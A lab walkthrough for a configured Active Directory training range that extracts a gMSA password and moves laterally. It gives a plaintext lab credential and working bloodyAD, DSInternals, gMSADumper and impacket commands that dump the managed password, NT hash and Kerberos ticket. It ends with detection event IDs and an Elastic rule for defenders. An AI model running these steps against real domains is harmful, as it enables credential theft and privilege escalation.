# WT#024 — gMSA Password Extraction

## Metadata
| Field | Value |
|-------|-------|
| **Target VM** | 192.168.77.10 (dc01) |
| **Domain** | cadre.local |
| **Starting Credential** | eng_cloud / Cl0ud_Eng! |
| **Tools Required** | DSInternals PowerShell module, gMSADumper |
| **Certifications** | CRTE |
| **MITRE ATT&CK** | T1552.005 |
| **Difficulty** | Easy |

## Prerequisites
- eng_cloud has ReadGMSAPassword right on gmsaTools$ gMSA object
- Active Directory PowerShell module available
- gmsaTools$ gMSA exists in cadre.local

## Attack Steps

### Step 1 — Verify ReadGMSAPassword access
```bash
# From kali, verify the ACE on the gMSA object
bloodyAD --host dc01.cadre.local -d cadre.local -u eng_cloud -p 'Cl0ud_Eng!' get aces 'CN=gmsaTools,CN=Managed Service Accounts,DC=cadre,DC=local'

# Expected: eng_cloud has ReadProperty on msDS-ManagedPassword
```

### Step 2 — Extract gMSA password using DSInternals
```powershell
# Run on a Windows domain-joined machine (or via PowerShell remoting to dc01)
# From a machine in cadre.local as eng_cloud:

# Method 1: DSInternals PowerShell module
Install-Module -Name DSInternals -Force
$gmsa = Get-ADServiceAccount -Identity 'gmsaTools' -Properties 'msDS-ManagedPassword'
$mp = $gmsa.'msDS-ManagedPassword'
$pw = ConvertFrom-AdManagedPasswordBlob $mp
$pw.SecureCurrentPassword | &{ [System.Runtime.InteropServices.Marshal]::PtrToStringAuto([System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($_)) }

# Method 2: Using DSInternals to get NT hash directly
$gmsaDN = (Get-ADServiceAccount -Identity gmsaTools).DistinguishedName
Get-ADReplAccount -Server dc01.cadre.local -DN $gmsaDN | Format-Table NTHash, AES128, AES256
```

### Step 3 — Alternative: gMSADumper from kali
```bash
# From kali, using python gMSADumper
git clone https://github.com/dirkjanm/gMSADumper.git
cd gMSADumper

# Dump gMSA password using eng_cloud credentials
python3 gMSADumper.py -u eng_cloud -p 'Cl0ud_Eng!' -d cadre.local -l dc01.cadre.local
```

### Step 4 — Use gMSA credentials for lateral movement
```bash
# With the gMSA NT hash or password, access resources gmsaTools$ has rights to
# Check which principals can retrieve the gMSA password (may include privileged accounts)

# Authenticate as gmsaTools$ and check access
impacket-getTGT 'cadre.local/gmsaTools$:<nt_hash_or_password>' -dc-ip 192.168.77.10
export KRB5CCNAME=/tmp/gmsaTools.ccache

# Use the gMSA identity to access services
# Check group memberships — gmsaTools$ may be in privileged groups
```

## Post-Exploitation Chain
WT#024 → gMSA hash → lateral movement using gMSA identity → potential DA escalation if gMSA is member of privileged groups

## Telemetry Verification
- **Elastic Index:** `logs-system.security-*`
- **Expected Events:**
  - Event ID 4662: ReadProperty on gMSA object (ObjectType: msDS-ManagedPassword) — explicit detection target
  - Event ID 5136: Read access to msDS-ManagedPassword attribute
  - Event ID 4624: Logon as gmsaTools$ after extraction
  - Sysmon EID 1: PowerShell.exe with DSInternals module loaded
- **Elastic Detection Rule:** `cadre-008-gmsa-extract` triggers on `event.code:4662 AND winlog.event_data.ObjectType:msDS-ManagedPassword`
- **Zeek:** `kerberos.log` showing TGT request as gmsaTools$ after extraction

## Status
CONFIGURED
